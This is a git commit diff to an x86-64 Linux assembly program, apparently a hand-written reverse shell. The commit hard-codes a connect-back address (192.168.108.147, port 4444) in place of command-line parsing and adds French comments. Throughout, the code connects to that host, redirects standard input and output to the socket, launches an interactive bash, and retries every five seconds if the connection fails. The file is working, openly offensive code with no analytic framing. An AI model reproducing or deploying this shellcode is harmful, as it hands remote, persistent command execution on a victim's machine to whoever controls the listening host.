cc0db0aecfb14538bc8e1edfdd10d1ea0b24f821
BySajed <127627616+BySajed@users.noreply.github.com>
2025-06-14 09:35:55 +0200

    Update main.asm

--- main.asm
+++ main.asm
@@ -1,8 +1,8 @@
 section .data
 TARGET_IP:
     dw 2                    ; AF_INET (2 bytes)
-    dw 0                    ; Port dynamique
-    dd 0                    ; IP dynamique
+    dw 0x5c11               ; Port 4444 (network byte order)
+    dd 0x936CA8C0           ; IP 192.168.108.147
     times 8 db 0            ; Padding
 
 welcome_msg:
@@ -12,89 +12,28 @@ welcome_msg:
     db 0
 welcome_len equ $ - welcome_msg
 
-usage_msg:
-    db "Usage: ./main <IP> <PORT>",0x0A
-    db "Exemple: ./main 192.168.1.147 4444",0x0A,0
-usage_len equ $ - usage_msg
-
 bash_path:
     db '/bin/bash',0
 
 bash_arg:
-    db '-i',0
+    db '-i',0               ; Mode interactif
 
 env_ps1:
-    db 'PS1=\[\033[1;32m\]\w\[\033[0m\]\$ ',0
+    db 'PS1=\[\033[1;32m\]\w\[\033[0m\]\$ ',0  ; Prompt couleur
 env_term:
     db 'TERM=xterm-256color',0
 env_path:
     db 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',0
 
 timespec:
-    dd 5
+    dd 5                    ; 5 secondes
     dd 0
 
 section .text
 global _start
 
 _start:
-    ; Récupération des arguments
-    pop rdi                 ; argc
-    cmp rdi, 3              ; Vérifier 3 arguments
-    jne show_usage
-    
-    pop rsi                 ; argv[0] (nom programme
-    pop rsi                 ; argv[1] (IP)
-    pop rdx                 ; argv[2] (port)
-    
-    call parse_ip_simple    ; Parsing IP simplifié
-    call parse_port_simple  ; Parsing port simplifié
     jmp main
-
-parse_ip_simple:
-    push rsi
-    
-    mov dword [TARGET_IP + 4], 0x936CA8C0  ; 192.168.108.147 par défaut
-    
-    pop rsi
-    ret
-
-parse_port_simple:
-    push rdx
-    xor rax, rax
-    xor rbx, rbx
-port_loop:
-    mov bl, [rdx]
-    test bl, bl             ; Vérifier fin de chaîne
-    jz port_done
-    cmp bl, '0'
-    jl port_done
-    cmp bl, '9'
-    jg port_done
-    
-    sub bl, '0'             ; ASCII -> numérique
-    imul rax, 10
-    add rax, rbx
-    inc rdx
-    jmp port_loop
-
-port_done:
-    ; Conversion network byte order
-    xchg al, ah
-    mov [TARGET_IP + 2], ax
-    pop rdx
-    ret
-
-show_usage:
-    mov rax, 1              ; sys_write
-    mov rdi, 1
-    lea rsi, [rel usage_msg]
-    mov rdx, usage_len
-    syscall
-    
-    mov rax, 60             ; sys_exit
-    mov rdi, 1
-    syscall
 
 main:
     call create_socket
@@ -110,16 +49,16 @@ main:
     call exit
 
 create_socket:
-    mov rax, 41
-    mov rdi, 2
-    mov rsi, 1
+    mov rax, 41             ; sys_socket
+    mov rdi, 2              ; AF_INET
+    mov rsi, 1              ; SOCK_STREAM
     mov rdx, 0
     syscall
-    mov r12, rax
+    mov r12, rax            ; Sauvegarde socket fd
     ret
 
 connect:
-    mov rax, 42
+    mov rax, 42             ; sys_connect
     mov rdi, r12
     lea rsi, [rel TARGET_IP]
     mov rdx, 16
@@ -127,9 +66,9 @@ connect:
     ret
 
 redir_io:
-    mov rsi, 0
+    mov rsi, 0              ; STDIN
 redir_loop:
-    mov rax, 33
+    mov rax, 33             ; sys_dup2
     mov rdi, r12
     mov rdx, rsi
     syscall
@@ -139,45 +78,48 @@ redir_loop:
     ret
 
 shell:
-    mov rax, 1
+    ; Affichage message d'accueil
+    mov rax, 1              ; sys_write
     mov rdi, 1
     lea rsi, [rel welcome_msg]
     mov rdx, welcome_len
     syscall
 
-    push 0
-    lea rax, [rel env_path]
+    ; Construction environnement
+    push 0                  ; NULL terminator
+    lea rax, [rel env_path] ; PATH
     push rax
-    lea rax, [rel env_term]
+    lea rax, [rel env_term] ; TERM
     push rax
-    lea rax, [rel env_ps1]
+    lea rax, [rel env_ps1]  ; PS1
     push rax
-    mov rdx, rsp
+    mov rdx, rsp            ; envp
 
-    push 0
-    lea rax, [rel bash_arg]
-    push rax
-    lea rax, [rel bash_path]
-    push rax
+    ; Construction arguments
+    push 0                  ; argv[2] = NULL
+    lea rax, [rel bash_arg] ; "-i"
+    push rax                ; argv[1]
+    lea rax, [rel bash_path]; "/bin/bash"
+    push rax                ; argv[0]
     
-    mov rdi, rax
-    mov rsi, rsp
-    mov rax, 59
+    mov rdi, rax            ; path
+    mov rsi, rsp            ; argv
+    mov rax, 59             ; sys_execve
     syscall
 
 error_handler:
-    mov rax, 3
+    mov rax, 3              ; sys_close
     mov rdi, r12
     syscall
 
 reconnect_if_fail:
-    mov rax, 35
+    mov rax, 35             ; sys_nanosleep
     lea rdi, [rel timespec]
     xor rsi, rsi
     syscall
     jmp main
 
 exit:
-    mov rax, 60
+    mov rax, 60             ; sys_exit
     xor rdi, rdi
     syscall
